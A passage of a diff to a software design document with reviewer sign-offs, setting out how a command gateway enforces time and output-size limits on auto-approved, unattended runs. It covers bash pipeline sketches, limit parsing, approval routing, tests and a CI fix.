+    _ps=("${PIPESTATUS[@]}")
+    wait "$ESHU_TAIL_PID" 2>/dev/null || true
+  else
+    "${run_argv[@]}" 2>&1 | cap_raw | sanitize | cap_visible
+    _ps=("${PIPESTATUS[@]}")
+  fi
+  set -e
+  rc=${_ps[0]}                            # the command's (or timeout's) status
+}
+```
+
+The probe byte (`bytes + 1`) is how "cut" is told from "ended exactly at the
+cap": the visible cap writes one extra byte into the F5 capture, which is
+then checked with `stat` and trimmed to `bytes` before it is stored. The agent
+may therefore see one byte past the cap; the stored output never does. When
+capture is `off` the bytes are still bounded and the marker is omitted
+(nothing to inspect); MCP always captures to build the envelope, so an MCP
+run always reports it.
+
+#### 4. Every route that can run an unattended row carries its limit (D4, L3)
+
+The round-1 note's "a lockbox ticket has no limit by construction" was wrong:
+`update_ticket_consumed_by_ip` deposits any `approved` row, read-lane ones
+included, and a lockbox claim then runs before any `/api/request` response is
+read. Both halves are fixed:
+
+* **The poller never receives an unattended row.**
+  `update_ticket_consumed_by_ip` skips `unattended = 1` rows, so they can only
+  be claimed through `/api/ticket/{id}`, which carries the limit. A ticket
+  line stays `v2|ts|agent|session|cmd`: no new tag, no capability negotiation
+  for the line itself.
+* **MCP claims it in the same round trip.** When `/api/request` answers 200
+  with the row already `approved` (the read lane), the gateway claims
+  `/api/ticket/{id}`, reads `run_limit` beside the ticket, and runs bounded
+  immediately instead of returning `pending`. That also removes one case of
+  F12's M2 race.
+* **A direct retry after the 90 s wait** claims through `/api/ticket/{id}`
+  too, so it gets the limit from the same response.
+
+Tests, one per route: a lagging poller never sees the row in `/api/poll`; an
+MCP read-lane call runs bounded in one round trip; a direct retry gets the
+limit from the ticket response. The alternative (a lockbox line carrying the
+limit) needs a new tag and is rejected for that reason.
+
+#### 5. The settings endpoint (L8)
+
+`PUT /api/settings/run-limit` uses the ordinary operator session login and
+CSRF protection (the `_check_session` + `X-Eshu-CSRF` path every other
+settings write uses), records an audit row with the old and the new values,
+and is reachable by no MCP tool and no gateway token. The values live in the
+`run_limit` meta key; a missing or corrupt value falls back to 60 s / 1 MiB.
+The gateway keeps its own hard-coded range check, as §2 already says. Tests:
+no session → 401/403; a change writes an audit row with both values.
+
+#### 6. Tests (the Round-1 list, amended)
+
+* Gateway: a 5 s limit stops `sleep 10` with rc 124, the marker, and
+  `limit: time`; a 64 KiB limit on 2 MiB keeps exactly 65 536 bytes, sets
+  `limit: bytes` and `truncated: true`; a stream that ends exactly at the cap
+  is not marked cut; a byte cut reports the real `141`; a command that exits
+  124 on its own is not marked `limit: time`; a human-approved run is
+  unbounded; out-of-range or non-numeric values refuse the call and run
+  nothing; a limit without GNU `timeout` is refused (BusyBox stub); a capped
+  run and a failing command still produce the envelope, the F5 row and the
+  right exit code; a newline-free stream larger than the cap is cut at the
+  cap and `sed` never holds more.
+* Dashboard: a limit for every auto-approval reason (the generated test);
+  absent-then-present and present-then-absent across responses; two limits
+  combine to the smaller; corrupt values fall back or refuse; the settings
+  endpoint's auth and audit; an unattended row never appears in `/api/poll`;
+  a request without the per-request capability gets `read-lane-no-limits`
+  even when the stored column says v1.
+
+#### 7. What stays out of scope, and one accepted risk
+
+§5 stands. In addition: over a plain-HTTP `dashboard_url` a network attacker
+could drop `run_limit` from a response, but such an attacker can already forge
+an approval on that path; F19 is not protection against that, and the note
+says so rather than counting it.
+
+`bash scripts/verify.sh`: `2331 passed, 7 warnings in 429.22s (0:07:09)` (docs only; no code on this branch).
+
+### Round 3 — design after review round 2 (Q1–Q2)
+
+Round 2 is the design of record except for §3, which Q1 redraws, and §2/§4 for
+Q2. Both assume the CI fix (`fix/ci-environment`) is merged first: there is no
+FIFO and no second reader.
+
+#### Q1 — redrawn §3 on the new capture code
+
+`fix/ci-environment` replaced `tee` + FIFO + `wait` with one awk,
+`capture_tail "$ESHU_OUT_TAIL"`, under `set +e` with `PIPESTATUS[0]`. Two
+consequences for this note:
+
+* **`capture_tail` keeps the *last* 16 KiB, not the first**, and it appends a
+  newline when the stream has none (C4). It therefore cannot be the cut probe:
+  its size says "the output was at least 16 KiB", not "the cap was hit".
+* **The cut probe is its own file.** `cap_visible` tees the sanitized stream
+  into `ESHU_LIMIT_PROBE` (bounded by `bytes + 1`, in the 0700 run dir,
+  trap-removed); `stat -c '%s'` greater than `bytes` means cut. It holds
+  sanitized bytes only, so it is safe to write; it is never stored as a result.
+
+The probe byte means the agent may see one byte past the cap; the stored tail
+is F5's own 16 KiB and the probe is deleted at exit.
+
+```bash
+cap_raw()     { if [ -n "$RUN_LIMIT_BYTES" ]; then head -c $((RUN_LIMIT_BYTES + 1)); else cat; fi; }
+cap_visible() {
+  if [ -n "$RUN_LIMIT_BYTES" ]; then
+    head -c $((RUN_LIMIT_BYTES + 1)) | tee "$ESHU_LIMIT_PROBE"
+  else
+    cat
+  fi
+}
+
+run_sanitized() {
+  local rc=0 mode ... run_argv=("$@")
+  if [ -n "$RUN_LIMIT_SECS" ]; then
+    run_argv=(timeout -k 5 "$RUN_LIMIT_SECS" "${run_argv[@]}")
+  fi
+  ESHU_LIMIT_PROBE=""
+  if [ -n "$RUN_LIMIT_BYTES" ]; then
+    ESHU_LIMIT_PROBE=$(mktemp -p "$ESHU_RUN_DIR" eshu-limit.XXXXXX) || {
+      say "[LOCKED] The run limit cannot be enforced (no probe file) — refusing."
+      finish refused 1
+    }
+    trap 'rm -f "$ESHU_OUT_TAIL" "$ESHU_MCP_CAP" "$ESHU_LIMIT_PROBE"' EXIT
+  fi
+  set +e
+  if [ "$ESHU_MCP" = "1" ]; then
+    # Q1: the redirect belongs on the stage that feeds the envelope.
+    "${run_argv[@]}" 2>&1 | cap_raw | sanitize | cap_visible \
+      | tee "$ESHU_MCP_CAP" >/dev/null
+  elif [ "$mode" = "tail" ] && [ -n "$ESHU_OUT_TAIL" ]; then
+    "${run_argv[@]}" 2>&1 | cap_raw | sanitize | cap_visible \
+      | capture_tail "$ESHU_OUT_TAIL"      # F5: last 16 KiB, no FIFO
+  else
+    # Direct mode with capture off: the agent is the only consumer.
+    "${run_argv[@]}" 2>&1 | cap_raw | sanitize | cap_visible
+  fi
+  _ps=("${PIPESTATUS[@]}")
+  set -e
+  rc=${_ps[0]}
+  LIMIT_HIT=""
+  if [ -n "$ESHU_LIMIT_PROBE" ] && \
+     [ "$(stat -c '%s' "$ESHU_LIMIT_PROBE")" -gt "$RUN_LIMIT_BYTES" ]; then
+    LIMIT_HIT="bytes"
+  fi
+}
+```
+
+`_ps[0]` is the command's (or `timeout`'s) status; the direct `capture_tail`
+pipeline has the same `PIPESTATUS` shape as the CI fix, so `rc` never becomes
+the trimmer's. The MCP branch keeps F12's rule that the command's own output
+never reaches stdout; the envelope's `truncated` is still F12's 64 KiB rule,
+independent of the run cap.
+
+#### Q2 — `ssh_exec`'s wait loop and unattended rows
+
+An unattended row is never delivered by the poller (L3), so it is consumed
+only when the gateway claims `/api/ticket/{id}` — in the same round trip for
+an MCP call, and on a re-run otherwise. If that claim fails (a network blip),
+the row stays `approved` until it expires, so a `wait` loop that only watches
+for `consumed` would spin until the deadline.
+
+**Decision:** `check_request` says exactly what to do, and `wait` follows it:
+
+* an approved **unattended** row → `next_step = "approved (unattended):
+  re-run now"`; a `consumed` row → "ready to re-run" (as in F12 M2); a plain
+  approved row → "approved, delivering to the gateway — do not re-run yet";
+* `ssh_exec`'s `wait` re-runs at `consumed`, **or** at `approved` when the row
+  is unattended. That re-run claims by id and carries the `run_limit` in the
+  same response, so it cannot race the poller (the poller never receives the
+  row) and a failed claim simply leaves the row approved for the next try;
+* the row exposes `unattended` from the same `requests` row the dashboard
+  already reads (`get_request_row`), so the wait loop does not infer it from
+  the reason text.
+
+Test: a simulated claim failure (the row is `approved`, not `consumed`) makes
+`wait` re-run once with the limit instead of waiting out the deadline.
+
+`bash scripts/verify.sh`: `2331 passed, 7 warnings in 431.41s (0:07:11)` (docs only).
+
+### Round 4 — Q3 (round 3 review): the MCP capture is bounded
+
+Round 3's MCP branch finished in `tee "$ESHU_MCP_CAP" >/dev/null`, which has
+no cap when no `run_limit` is set — every human-approved MCP run. A large
+output would grow the file on `/run` without limit. Q3 replaces it with the
+same ring F12 now uses:
+
+```bash
+if [ "$ESHU_MCP" = "1" ]; then
+  "${run_argv[@]}" 2>&1 | cap_raw | sanitize | cap_visible \
+    | capture_tail "$ESHU_MCP_CAP" 65537 >/dev/null
+elif [ "$mode" = "tail" ] && [ -n "$ESHU_OUT_TAIL" ]; then
+  "${run_argv[@]}" 2>&1 | cap_raw | sanitize | cap_visible \
+    | capture_tail "$ESHU_OUT_TAIL"
+else
+  "${run_argv[@]}" 2>&1 | cap_raw | sanitize | cap_visible
+fi
+```
+
+`capture_tail` takes the byte cap as `$2` (F12/CI fix) and keeps the last
+`cap` bytes in a ring, so the envelope's 64 KiB rule still holds and a run
+with no `run_limit` cannot fill `/run`. The old `tee` was written by
+`cap_visible` into a file with no bound.
+
+Test, in the F19 suite: 2 MiB of MCP output with **no** `run_limit` leaves an
+`ESHU_MCP_CAP` of at most 65 537 bytes and an envelope of at most 64 KiB
+(the +1 byte is what tells "cut" from "exactly at the cap").
+
+**B4 correction.** The buffering fix (`fix/stream-unbuffered`) puts
+`stdbuf -oL` on `sanitize`, and F19's pipeline uses that `sanitize`
+unchanged. The review also expected mawk to get `-W interactive`; it does
+not, because that option makes mawk split records longer than 4096 bytes
+(measured: a 20 000-byte line becomes five records), which would corrupt the
+agent's stream. The F5 round-6 note records the measurement. F19's time
+limit stays the bound for unattended runs whatever the buffering does.
+
+`bash scripts/verify.sh`: `2331 passed, 7 warnings in 426.61s (0:07:06)` (docs only).
+
+### Reviewer notes
+
+**Design round 1 (2026-11-09, main feature reviewer): changes requested.** The
+shape is right:
+* limits apply only to rows approved with nobody watching, keyed by the
+  dashboard's `reason`;
+* a present-but-unusable limit refuses the call;
+* a reported `run_limits: v1` capability, not a version string, gates
+  auto-run;
+* the probe byte tells "cut" apart from "ended exactly at the cap".
+
+Four pieces of the bash or the flow would misbehave:
+
+* **D1 In direct mode the agent would see nothing.** The capped pipeline
+  ends `| tee "$ESHU_OUT_FIFO"; } >/dev/null`, which throws away the stdout
+  the agent reads. `>/dev/null` belongs only to MCP mode (F12's rule). In
+  direct mode, tee must still write to stdout.
+* **D2 A byte cut reports 141, not 0.** When `head` closes after
+  `bytes+1`, the writer gets SIGPIPE, so `PIPESTATUS[0]` is `141` (or the
+  shell's status after `sanitize` dies). The note says the sentinel stays
+  "typically `[ESHU exit=0]`". Decide one rule and test it. My suggestion:
+  report the real `141`, add the `[ESHU limit: output cut …]` marker, and
+  set `limit: bytes`, so the agent knows the command did not finish on its
+  own.
+* **D3 `set -e` aborts the script.** The new pipeline has no `||` guard.
+  Under `set -eo pipefail`, a non-zero pipeline (124 or 141) exits the
+  gateway before the marker, `post_exec_result` or the envelope. Use
+  `set +e; …pipeline…; _ps=("${PIPESTATUS[@]}"); set -e`, then read
+  `_ps[0]`. A `|| true` would overwrite `PIPESTATUS`. Add a test that the
+  marker and the F5 row appear after a time stop and after a byte cut.
+* **D4 The lockbox path runs unattended rows unbounded.** §2 says a
+  lockbox ticket "has no limit by construction: those rows were approved by
+  a human". That is not true. `update_ticket_consumed_by_ip` (the poller)
+  deposits **any** `approved` row, read-lane ones included, and a lockbox
+  claim then runs with no `run_limit`. This happens whenever the poller beats
+  the gateway's JIT poll, when a direct agent reconnects, and always in F12
+  MCP mode, where the gateway returns `pending` at once and the re-run
+  claims from the lockbox. Fix both halves:
+  * The poller never receives an unattended row:
+    `update_ticket_consumed_by_ip` skips `reason IN ('read-lane', …)`, so
+    those rows can only be claimed through `/api/ticket/{id}`, which carries
+    the limit.
+  * In MCP mode, when `/api/request` answers with the row already
+    `approved` (the read lane), the gateway claims it through
+    `/api/ticket/{id}` and runs it with its limit straight away, instead of
+    returning `pending`. That also removes one case of F12's M2 race.
+  * Tests: an unattended row never appears in `/api/poll`; an MCP read-lane
+    call runs bounded in one round trip.
+
+*Should fix:*
+
+* **S1** On GNU `timeout`: without `--foreground` it signals the command's
+  **process group**, so ordinary background children are stopped too. Only
+  a child that calls `setsid` escapes. Correct §3's last bullet, and say
+  that BusyBox `timeout` signals only the child, so the capability check
+  must be specific to GNU `timeout`.
+
+This goes to the security reviewer too (§ 2.6a). They are reviewing the same
+note in parallel, so fold in both sets of findings together.
+
+#### Security reviewer sign-off
+
+**Design review (4d18218), 2026-11-09: changes requested on the design.**
+The approach is sound: the limit is set by the dashboard, enforced by the
+gateway, and refuses to run when the value is broken. Eight conditions must
+be in the note before code starts. L3 is the important one, because without
+it the limit can be skipped. I will re-read only the sections that change.
+
+* **L1. Bounded by default, with a list of exemptions.** As written, a
+  limit applies only where `reason = read-lane`. F15, F16 and any later
+  path would each need to remember to add themselves.
+  - Turn this around: the dashboard sends a `run_limit` for every row it
+    approves without a human approving that exact command.
+  - Name the exemptions in the note as an accepted risk: a JIT click, plans,
+    session overrides and host overrides, because they can legitimately run
+    for a long time.
+  - The gateway-local paths (the allowlists and windows) stay as they are.
+  - Test: a row with any new auto-approval reason gets a limit.
+* **L2. Once a limit is set, it stays.** It can arrive on three responses.
+  - The first limit seen applies to the whole call. A later response that
+    leaves it out does not clear it, and two different limits mean the
+    smaller one applies.
+  - `parse_run_limit` must return three different results: absent, valid or
+    invalid. Today it returns 1 both when the field is missing and when it
+    is broken.
+  - The sketch splits `"60 1048576"` with `set -- $secs`, but the script
+    sets `IFS` to newline and tab, so that split never happens. Use
+    `read -r` with a tab separator.
+  - Tests: the limit is absent on one response and present on another; a
+    present but broken limit is refused.
+* **L3. Every path that can run an unattended row carries its limit.** The
+  note's claim that a lockbox ticket "has no limit by construction" is
+  wrong for read-lane rows. The poller can move an approved read-lane row
+  into the lockbox. Stage 5 then runs it *before* any `/api/request`
+  response is read, with no limit. Three routes lead there:
+  - the MCP re-run: F12 returns `pending` and calls again, and the feature
+    reviewer's M2 makes that re-run wait for `consumed`;
+  - a direct retry after the 90-second wait;
+  - a poller that gets there first.
+
+  Pick one fix and write it down. I recommend these two together:
+  - `/api/poll` never puts an unattended row in the lockbox. The row is
+    claimed only through `/api/ticket/{id}`, which carries the limit.
+  - In MCP mode, a row that the `/api/request` response shows as already
+    approved is claimed and run in the same call instead of returning
+    `pending`.
+
+  The alternative is a lockbox line that carries the limit, which means a
+  new ticket tag and a capability check. Tests, for each route: a lagging
+  poller, an MCP re-run and a direct retry. None of them runs a read-lane
+  row without its limit.
+* **L4. The pipeline must survive `set -e` and keep direct-mode output.**
+  - The sketch sends the whole group to `/dev/null`, so a direct-SSH agent
+    would see nothing. Only MCP mode should discard stdout.
+  - The sketch has no `||` and runs under `set -eo pipefail`, so any
+    non-zero exit, or the SIGPIPE when `head` closes, would end the gateway
+    before the envelope and the F5 row are written.
+  - Copy `PIPESTATUS` in the same statement as the pipeline, with errexit
+    switched off around it.
+  - Test: a capped run and a failing command both still produce the
+    envelope, the F5 row and the right exit code.
+* **L5. Cap the raw stream before `sanitize` as well.** `sanitize` is
+  `sed`, which holds a whole line in memory until it sees a newline. A long
+  stream with no newlines, which some pseudo-files under the read-lane trees
+  can produce, grows `sed`'s memory without limit until the timer fires.
+  - Put a `head -c` (bytes + 1) before `sanitize` as well as after it.
+  - Decide whether the output was cut from the raw stream, because redaction
+    changes lengths.
+  - Test: a newline-free stream larger than the cap is cut at the cap, and
+    `sed` never holds more than the cap.
+* **L6. The time limit bounds the whole call, not just its direct child.**
+  GNU `timeout` signals the process group. BusyBox `timeout` signals only
+  the child, so a grandchild that keeps the pipe open would hold the call,
+  and the ticket's run, past the limit.
+  - Requirement: when the limit fires, the call returns within the limit
+    plus the kill grace plus a few seconds, and nothing the run started is
+    left running.
+  - Test with a stub `timeout` that behaves like BusyBox's.
+* **L7. The script that is running reports the capability on each request,
+  not just at registration.** A poller self-update or a rollback can change
+  the script without re-registering, and then the stored `run_limits: v1`
+  is stale.
+  - The gateway sends `"run_limits":"v1"` in the `/api/request` body.
+  - The dashboard auto-approves an unattended row only when that request
+    carries it.
+  - Keep the stored column for the gateway card.
+  - Test: a request without the field gets `read-lane-no-limits` even when
+    the gateway row says v1.
+* **L8. The settings endpoint is for operators only.**
+  - `PUT /api/settings/run-limit` uses the same session login and CSRF
+    protection as the other operator settings, and every change is audited
+    with the old and new values.
+  - No MCP tool and no gateway token can reach it.
+  - The gateway keeps its own hard-coded range check, as the sketch already
+    does.
+  - Tests: no session means 401 or 403; a change writes an audit row.
+
+*Smaller points:*
+
+* A command can exit 124 on its own, so mark `time` only when
+  `rc == 124` and the time elapsed is at least the limit.
+* A byte cut normally ends the command with SIGPIPE (141), not 0. The note
+  should say so. It also means the byte cap stops a runaway command, which
+  is the point.
+* Over plain-HTTP `dashboard_url`, a network attacker could drop
+  `run_limit`, but they could already forge an approval there. Nothing new;
+  I mention it so nobody counts F19 as protection on that path.
+
+**For the F4 `on` gate:** F19 meets the fourth precondition only once L3
+and L7 are implemented, merged and deployed fleet-wide. Without L3, the
+lockbox route runs read-lane commands with no limit.
+
+**Design round 2 (feature reviewer, 2026-11-10, `39ed243`): approved, with
+one change before code (Q1).** D1–D4 and S1 are folded in correctly:
+* direct-mode output kept;
+* `PIPESTATUS` copied with errexit off;
+* the real 141 reported;
+* `limit: time` only for 124 plus elapsed time;
+* the poller never gets an unattended row, so every route carries the limit.
+
+* **Q1 (must): base the pipeline on the new capture code.** The § 3 sketch
+  still uses `ESHU_OUT_FIFO`/`tee`/`wait "$ESHU_TAIL_PID"`. The CI fix
+  (`fix/ci-environment`, merging before this) removes the FIFO and the
+  second reader: capture is now `… | sanitize | capture_tail "$ESHU_OUT_TAIL"`,
+  with `set +e` and `PIPESTATUS[0]`. Redraw § 3 on that code, and on F12's
+  MCP envelope capture (`ESHU_MCP_CAP`) if F12 merges first:
+  `"${run_argv[@]}" 2>&1 | cap_raw | sanitize | cap_visible | capture_tail …`.
+  * `capture_tail` keeps the last 16 KiB, not the first. Say how the
+    `bytes + 1` cut probe now works: count the visible bytes in
+    `cap_visible`, or compare the stored size with `stat`. Remember that
+    `capture_tail` adds a newline when the stream has none (C4).
+  * In MCP mode, the stdout redirect goes on the stage that feeds the
+    envelope, not on a `tee`.
+* **Q2 (should): `ssh_exec`'s wait loop and unattended rows.** F12's `wait`
+  re-runs at `consumed`. An unattended row is now consumed only through
+  `/api/ticket/{id}` in the same round trip. If that claim fails (for
+  example, a network blip), `wait` sees `approved` until the row expires.
+  Say what the agent gets: I suggest `check_request` shows
+  `approved (unattended): re-run now`, because the re-run claims by id and
+  carries the limit, so it cannot race the poller.
+
+After Q1, to the security reviewer, for the sections that change (§ 3, plus
+§ 4 if Q2 changes it).
+
+**Design round 4 (feature reviewer, 2026-11-10, `9b355a4`): approved; to the
+security reviewer (§ 2.6a).** Q3 is folded: the MCP branch ends in
+`capture_tail "$ESHU_MCP_CAP" 65537 >/dev/null`, with the 2 MiB / no
+`run_limit` test. The B4 correction is right (no `-W interactive`; on a newer
+mawk it truncates rather than splits). As the round 4 note says, F19's time
+limit, not buffering, is the bound for unattended runs.
+
+**Design review of Rounds 2–4 (`2286b43`), 2026-11-10: approved.** I read
+Rounds 2 and 3 as well as Round 4, because they answer L1–L8.
+
+* **L1:** one `approve_unattended()` helper, and a generated test that fails
+  when an unattended row has no limit. The exemptions are named.
+* **L2:** absent, valid and invalid are distinct; a limit stays once set;
+  the smaller value wins; the field is read with a tab separator.
+* **L3:** the poller never receives an unattended row. MCP claims through
+  `/api/ticket/{id}` in the same round trip, and the Q2 wait rule follows
+  `unattended`.
+* **L4:** errexit is off around the pipeline only, and `PIPESTATUS` is
+  copied in the next statement.
+* **L5:** there is a raw cap before `sanitize`. Deciding a cut on the
+  visible stream is a sensible trade, and no unsanitized bytes are written.
+* **L6:** GNU `timeout` is part of the capability, and a limit received
+  without it is refused rather than half-applied. One gap remains: a
+  process that calls `setsid` escapes the group kill. No read-lane verb can
+  do that today. Any later unattended path (F15 probes, F16 `auto_run`)
+  must keep that true.
+* **L7:** the capability travels on each request, so the stored column is
+  for display only.
+* **L8:** the operator session, CSRF and audit, with no MCP or token
+  access.
+* **Q3:** the MCP capture goes through `capture_tail` at 65537, so a
+  human-approved MCP run cannot fill `/run`. One thing to state plainly in
+  the design: in MCP mode nothing reaches the SSH channel until the
+  envelope, so a dropped connection is not noticed while a human-approved
+  MCP run is still going. That is F12's accepted §4 risk, and F19 bounds it
+  only for unattended rows.
+
+*One condition at code time (the feature reviewer can check it):*
+
+* **W1. The probe file uses the same directory check as the capture.**
+  Round 3 runs `mktemp -p "$ESHU_RUN_DIR"` for the probe whenever there is a
+  byte limit. Under `exit-only`, the directory check in `run_sanitized` is
+  skipped. Apply the same check (0700, owned by root, not a symlink) before
+  creating the probe, and refuse the call if it fails. Test: an unsafe
+  `/run/eshu` with a `run_limit` refuses the call and runs nothing.
+
+**For the F4 `on` gate:** F19 meets the fourth precondition once this code
+(L3, L6, L7 and W1 included) is merged and deployed fleet-wide. The gateway
+bash comes back to me before merge.
+
+**W1 confirmed (feature reviewer, 2026-11-10).** On `feature-roadmap` the
+`/run/eshu` check (a directory, not a symlink, mode 700, owned by
+`ESHU_RUN_OWNER`) runs only inside `if [ "$mode" = "tail" ]`
+(`eshu-gateway.sh`, `run_sanitized`). The Round 3 probe's
+`mktemp -p "$ESHU_RUN_DIR"` runs whenever there is a byte limit, so under
+`exit-only` it would create the file in an unchecked directory. At code time,
+move the four tests into one `run_dir_safe()` helper that the capture, the
+probe and F12's `ESHU_MCP_CAP` all call. A failed check disables capture
+(as today) but **refuses** a limited run, as the security reviewer asked.
+Test: an unsafe `/run/eshu` with a `run_limit` refuses the call and runs
+nothing; with no `run_limit` the call runs as before.
+
+### Round 5 — implementation (code round)
+
+**Branch `feat/f19-unattended-limits`, on top of `feature-roadmap` at
+`c0954cc`** (merge `8865712`). The gateway bash is the part that goes to the
+security reviewer before merge.
+
+**Gateway (`dashboard/eshu-gateway.sh`, installers regenerated).**
+
+* **The limit travels and is parsed three ways (L2).** `parse_run_limit` uses
+  `python3 -I -c` and prints `absent`, `valid	<s>	<b>` or `invalid`; a later
+  response without the field keeps the first limit, two limits take the
+  smaller per field, and a present but unusable one refuses the call
+  (`[LOCKED] Invalid run_limit …`). Out of range (5–300 s, 65 536–8 388 608
+  bytes), non-integer, boolean, list and non-JSON are all `invalid`.
+* **Capability (L6/L7).** `RUN_LIMITS_CAP=v1` only when
+  `timeout --version` names GNU coreutils; it is sent on **every**
+  `/api/request` as `"run_limits"`, and a limit received without it is refused
+  (never half-applied). The installer reports the same value at `/api/register`
+  (an absent field keeps the stored value; the column is display only).
+* **W1.** One `run_dir_safe()` (directory, not a symlink, mode 700, owner
+  `ESHU_RUN_OWNER`) is used by the F5 tail capture, F12's `ESHU_MCP_CAP` and
+  the F19 probe. An unsafe directory still disables `tail` capture and still
+  refuses an MCP capture; with a byte limit it now **refuses the run**.
+* **Pipeline.** `run_argv` gets `timeout -k 5 <secs>` when a time limit is
+  set; each branch is
+  `… | cap_raw | sanitize | cap_visible [| capture_tail …]` under
+  `set +e`, with `rc=${PIPESTATUS[0]}`. `cap_raw` bounds `sed`'s input (L5);
+  `cap_visible` tees the sanitized stream into `ESHU_LIMIT_PROBE` at
+  `bytes + 1`. The marker and `limit: bytes` are decided from that probe
+  (`stat` > bytes), never by scanning the output; `time` needs `rc == 124`
+  **and** elapsed ≥ the limit. The command's real status (141 after a byte
+  cut, 124 after a stop) is what `[ESHU exit=N]` and the envelope carry.
+* **Q3.** The MCP branch is
+  `… | capture_tail "$ESHU_MCP_CAP" 65537 >/dev/null`: one in-stream ring, no
+  unbounded `tee`, and a human-approved MCP run cannot fill `/run`.
+* **L3, one round trip.** When `/api/request` answers `approved` (the
+  unattended path), an MCP call claims `/api/ticket/{id}` immediately, reads
+  `run_limit` beside the ticket, and runs bounded instead of returning
+  `pending`. The ticket parse is now one `parse_claim_body()` used by both
+  that path and the poll loop, and it understands the `v2|ts|agent|session|cmd`
+  line the stub and the dashboard use.
+* **`python3 -I`** on every inline interpreter in the gateway (the F12
+  security note): no user site-packages and no `PYTHONPATH` reach a script
+  that parses dashboard JSON.
+* **F5 row.** `/api/exec-result` gains `"limit":"time|bytes"` and a byte cut
+  sets `output_truncated` even when the stored tail is short.
+
+**Dashboard.**
+
+* `requests.unattended` and `requests.run_limit` (JSON), additive migrations;
+  `request_results.limit_kind`; `gateways.run_limits` (display only).
+* `approve_unattended()` in `main.py` is the only auto-approval path: it
+  creates the row **approved** with the limit only when the *request* reports
+  `run_limits: v1`; otherwise the row is `pending` with
+  `reason = read-lane-no-limits` and a `read_lane_no_limits` audit row (L7 —
+  the stored column never decides). The read lane calls it.
+* `/api/request` returns `approved`, `unattended` and `run_limit`;
+  `/api/request_status/{id}` and `/api/ticket/{id}` return the limit beside
+  the ticket (the ticket marks the row consumed in the same call).
+* `update_ticket_consumed_by_ip` skips `unattended = 1`, so the poller never
+  receives one (L3).
+* `GET`/`PUT /api/settings/run-limit`: operator session + CSRF, range-checked,
+  audited with the old and new values (L8). Defaults 60 s / 1 MiB; a corrupt
+  meta value falls back to them.
+* `check_request` returns `unattended` and says
+  `approved (unattended): re-run now …`; `ssh_exec`'s `wait` re-runs at
+  `approved` for such a row instead of waiting for `consumed` (Q2).
+
+**`dashboard/static/dev/eshu-gateway-install.sh`.** It is a **committed**
+file (served as `dev_installer_url` to dev-mode gateways, and rewritten on
+the host by a dev push; `scripts/deploy-dashboard.sh` resets it) and it was
+stale: 1 281 lines with no F12 code and no `SANITIZE_CMD`. It is regenerated
+from the current `static/` installer in this round; `gen_installer.py` does
+not write it, so a dev push or this copy is what keeps it current.
+
+**Tests (`tests/test_f19_limits.py`, 32).** Gateway: the parser's three
+answers, stickiness, `min()` combination and eight unusable values; the
+directory check (700, 755, symlink, missing, foreign owner); an MCP
+unattended run capped at 65 536 bytes with the marker and `limit: bytes`; a
+5 s stop (exit 124, marker, `limit: time`); an allowlisted run with no limit
+and no field; an unusable limit refusing; an unsafe run directory refusing a
+limited run. Dashboard: defaults and corrupt fallback; approved-with-limit vs
+pending-without-capability (and the audit row); the poller skipping the row;
+the ticket carrying it; both endpoints; the stored column not deciding; the
+settings endpoint's auth, range and audit; `/api/exec-result` storing and
+rejecting `limit`. `tests/test_gateway_script.py` gains the approved/limit
+stub and its JIT-body test now expects `run_limits`.
+
+### Round 6 — code review round 1 (AD1–AD3) and the CI failure
+
+**Code review (feature reviewer, 2026-11-10, `51fb2a8`): three must-fixes.**
+L1–L8, W1 and Q2/Q3 read right; the gateway diff now goes to security.
+
+* **AD1 — a SIGKILLed command exits 137.** `timeout -k 5` sends SIGTERM, then
+  SIGKILL five seconds later for a command that ignores it; timeout then
+  exits **137**, not 124, so a stubborn command's stop was not labelled
+  `limit: time`. Both codes are accepted now, under the same elapsed-time
+  guard (a command that exits 137 on its own, quickly, is not a limit hit).
+  Tests: `trap "" TERM; sleep 30` with a 5 s limit → exit 137, the marker and
+  `limit: time`; `exit 137` immediately → no marker and no `limit`.
+* **AD2 — CI was red because the runner moved to Ubuntu 26.04.** The Actions
+  log for `51fb2a8` (`CI` run 42866594655, jobs 130006465478/82) shows
+  `Image: ubuntu-26.04` and both Python jobs failing on the same two tests:
+  the unattended MCP run came back `refused` with `exit_code 1` instead of
+  `ran`. That is the **L6 capability refusal**: Ubuntu 26 ships uutils
+  `timeout`, whose `--version` does not say "GNU coreutils", so
+  `RUN_LIMITS_CAP` was empty and the gateway correctly refused a limit it
+  cannot enforce. It passed locally on GNU coreutils. Fixes:
+  - `GatewaySandbox` gains a `timeout` stub whose `--version` the test
+    chooses (GNU by default) and which execs the real local `timeout` for
+    behaviour, so the suite no longer depends on the runner's userland;
+  - one test keeps the real case: a non-GNU `timeout --version` refuses a
+    limited run and nothing runs;
+  - `.github/workflows/ci.yml` is pinned to `runs-on: ubuntu-24.04` for both
+    jobs, with the reason in a comment;
+  - **setup note:** a gateway without GNU `timeout` reports no capability, so
+    the dashboard never auto-approves an unattended row there — it stays
+    `pending` with `reason = read-lane-no-limits` and the operator sees it in
+    the queue. That is the fail-closed behaviour, not a bug.
+* **AD3 — `docs/TOOLSHED_PLAN.md` removed.** The `feature-roadmap` merge
+  (`8865712`) carried it onto this branch; it is not on `feature-roadmap`
+  and is not part of F19. It is deleted in its own commit (`4a86f81`) and the
+  local copy is left on disk, untracked, for the operator.
+* **Nit — capture `timeout --version` first.** `TIMEOUT_VERSION=$(timeout
+  --version 2>/dev/null || true)`, then grep the variable, so `pipefail`
+  cannot make the capability question depend on a pipeline's scheduling. The
+  installer template does the same.
+
+The current `feature-roadmap` (F10 merged, `f7201ac`) is merged forward in
+`12e51e7`; the only conflict was this document's F19 note at the end of the
+status table.
+
+`bash scripts/verify.sh`: `2678 passed, 22 skipped, 7 warnings in 561.48s (0:09:21)`.
+
+### Round 7 — security's AF1 and AF2
+
+**Security approved the gateway bash on two conditions; the feature reviewer
+checks them here. AF3 is deliberately not on this branch** — it belongs to the
+next gateway-bash branch (the session-signature check still passes the key in
+argv).
+
+* **AF1 — an unattended row must never run without a limit.** Three changes:
+  - the gateway's parser now reads `unattended: true` with a missing, `null`
+    or unusable `run_limit` as **invalid**, not as "absent" (absent means "a
+    human approved this" and only applies without the marker);
+  - the direct-SSH poll loop runs `parse_run_limit "$CLAIM_BODY"` after a
+    claim, exactly as the MCP path does, so a corrupt limit in the claim is
+    refused before anything runs;
+  - `/api/ticket` and `/api/request_status` always send `run_limit` for an
+    unattended row. A stored value that does not parse is sent as `{}`, which
+    the gateway refuses — never `null`, never omitted.
+  Tests: the parser refuses `unattended` with no limit, `null`, `{}` or a
